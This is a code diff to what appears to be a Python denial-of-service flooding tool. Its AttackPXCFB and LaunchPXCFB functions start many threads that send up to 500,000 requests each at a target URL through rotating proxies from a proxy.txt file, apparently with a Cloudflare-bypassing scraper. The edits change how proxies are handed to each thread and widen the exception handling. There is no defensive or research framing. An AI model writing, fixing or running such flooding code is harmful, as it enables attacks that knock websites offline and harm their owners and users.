@@ -549,7 +549,6 @@ def AttackPXCFB(url, until_datetime, scraper,proxies,th):
 
             for _ in range(500000):
                 if proxies:
-                    proxy = random.choice(proxies).strip().split(":")
                     proxy_url = f"http://{proxy[0]}:{proxy[1]}"
                     print(proxy_url+'----proxy-url')
                     proxies = {
@@ -569,7 +568,7 @@ def AttackPXCFB(url, until_datetime, scraper,proxies,th):
 
                 else:
                     print('proxy rỗng')
-        except ValueError as e:
+        except Exception as e:
             print('falid--------------',e)
             break
         
@@ -596,14 +595,13 @@ def LaunchPXCFB(url, th, t):
 
     })
     proxies = open("./proxy.txt", 'r').read().split('\n')
-    threads = []
 
     if isinstance(proxies, list) and proxies:
 
         for i in range(int(th)):
             try:
                 proxy = random.choice(proxies).strip().split(":")
-                thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper,proxies,th))
+                thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper,proxy,th))
                 thd.start()
                
 
